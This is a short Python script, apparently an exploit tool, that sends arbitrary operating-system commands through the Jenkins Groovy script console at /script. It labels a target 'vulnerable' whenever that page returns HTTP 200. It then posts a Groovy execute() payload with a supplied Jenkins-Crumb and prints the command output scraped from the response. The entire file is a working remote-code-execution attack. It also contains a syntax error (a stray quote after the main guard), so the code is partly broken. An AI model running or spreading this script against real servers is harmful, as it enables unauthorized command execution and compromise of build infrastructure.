import requests
import argparse
import re
import argparse

def checkrce(url):
    url = url + "/script"
    r = requests.get(url)
    if r.status_code == 200:
        return True
    else:
        return False

def rce_output(url, command, crumbs):
    url = url + "/script"
    script_payload = 'def os = "os_command".execute();println("${os.text}");'.replace("os_command", command)
    data = {
        "script": script_payload,
        "Jenkins-Crumb": crumbs,
        "Submit":"Run"
    }
    r = requests.post(url, data=data)
    m = re.search('<h2>Result</h2><pre>(.*)</pre>', r.text, flags=re.DOTALL)
    if m:
        output = str(m.group(1))
        print("[+] Obtained output from {os_command} command\n".format(os_command=command))
        print(output.strip())
    else:
        print("[*] There is no output!")

def main(url, command, crumbs):
    if checkrce(url) == True:
        print("[+] {url} is vulnerable!".format(url=url))
        rce_output(url, command, crumbs)
    else:
        print("[!] {url} cannot be exploited".format(url=url))

if __name__ == '__main__' :"
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help="Vulnerable URL")
    parser.add_argument('-cr', '--crumb', help="String value of Jenkins-Crumb")
    parser.add_argument('-c','--command', help="Command to be executed")
    args=parser.parse_args()
    main(args.url, str(args.command), str(args.crumb))
